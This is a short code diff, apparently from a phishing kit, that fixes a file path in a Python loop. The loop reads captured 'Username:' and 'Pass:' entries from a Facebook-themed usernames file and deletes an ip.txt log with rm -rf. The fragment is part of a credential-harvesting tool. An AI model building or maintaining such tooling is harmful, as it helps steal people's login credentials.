@@ -11,7 +11,7 @@ while True:
 		os.system("rm -rf  /site/facebook/ip.txt")
 	if os.path.isfile("site/facebook/usernames.txt")==True:
 	 #time.sleep(0.75)
-		tr2=open("aa/site/facebook/usernames.txt","r")
+		tr2=open("site/facebook/usernames.txt","r")
 		log2=tr2.readline()
 		start=int(log2.find("Username:"))
 		end=int(log2.find("Pass:"))
